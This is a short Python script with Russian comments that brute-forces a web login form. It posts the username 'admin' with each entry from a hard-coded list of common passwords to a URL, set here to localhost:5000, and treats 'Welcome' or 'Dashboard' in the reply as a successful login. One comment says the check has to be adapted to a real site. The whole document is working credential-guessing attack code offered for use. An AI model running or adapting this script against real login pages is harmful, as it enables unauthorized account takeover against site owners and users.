import requests 
from tqdm import tqdm 
def brute_force(url, username, password_list): 
    print(f"Начинаем брутфорс для пользователя: {username}")
    for password in tqdm(password_list, desc="Прогресс"):
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, data=data, timeout=5)  # Проверяем успешный вход
            # В реальности нужно адаптировать под конкретный сайт
            if "Welcome" in response.text or "Dashboard" in response.text:
                print(f"\n[+] Пароль найден: {password}")
                return password
        except requests.RequestException as e:
            print(f"\n[-] Ошибка при запросе: {e}")
            continue
    print("\n[-] Пароль не найден")
    return None

if __name__ == "__main__":
    target_url = "http://127.0.0.1:5000"
    target_username = "admin"
    # Создаем список паролей
    common_passwords = [
        "123456", "password", "123456789", "12345678", "12345", "qwerty", "1234567", "111111",
        "1234567890", "123123", "admin", "letmein", "welcome", "monkey", "1234", "login", "abc123",
        "starwars", "123", "dragon", "passw0rd", "master", "hello", "freedom", "whatever", "qazwsx",
        "trustno1", "654321"
    ]
    # Запускаем брутфорс
    found_password = brute_force(target_url, target_username, common_passwords)
